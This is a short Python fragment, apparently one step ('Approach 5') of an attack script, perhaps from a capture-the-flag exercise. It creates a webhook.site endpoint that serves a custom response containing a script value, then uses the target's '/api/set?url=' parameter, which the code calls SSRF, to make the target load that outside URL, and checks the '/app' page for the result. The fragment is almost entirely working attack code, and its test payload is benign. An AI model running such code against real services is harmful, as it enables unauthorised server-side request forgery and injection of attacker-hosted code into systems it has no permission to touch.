# Approach 5: Try using webhook.site with a custom response
# webhook.site lets you define what response to return
print("\n[+] Trying webhook.site...")
try:
    # webhook.site gives you a unique URL
    # The free version doesn't let you set custom responses easily via API
    # But let's see what happens
    
    # First get a unique webhook URL
    r = requests.get("https://webhook.site/token", timeout=10)
    if r.status_code == 200:
        token_data = r.json()
        token = token_data.get('uuid')
        webhook_url = f"https://webhook.site/{token}"
        print(f"[+] Webhook URL: {webhook_url}")
        
        # Try to set a custom response
        # webhook.site allows setting response via PUT to /token/{uuid}/response
        custom_response = {"script": "print(123)"}
        r2 = requests.put(
            f"https://webhook.site/token/{token}/response",
            json=custom_response,
            timeout=10
        )
        print(f"[+] Set custom response: {r2.status_code}")
        
        # Now test it
        r3 = requests.get(webhook_url)
        print(f"[+] Webhook response: {r3.text[:200]}")
        
        # Test with SSRF
        set_url = f"{target}/api/set?url={urllib.parse.quote(webhook_url)}"
        r4 = requests.get(set_url)
        print(f"[+] Set webhook URL: {r4.text}")
        
        r5 = requests.get(f"{target}/app")
        print(f"[+] App with webhook: {r5.status_code}")
        print(r5.text[:1000])
except Exception as e:
    print(f"[+] webhook error: {e}")

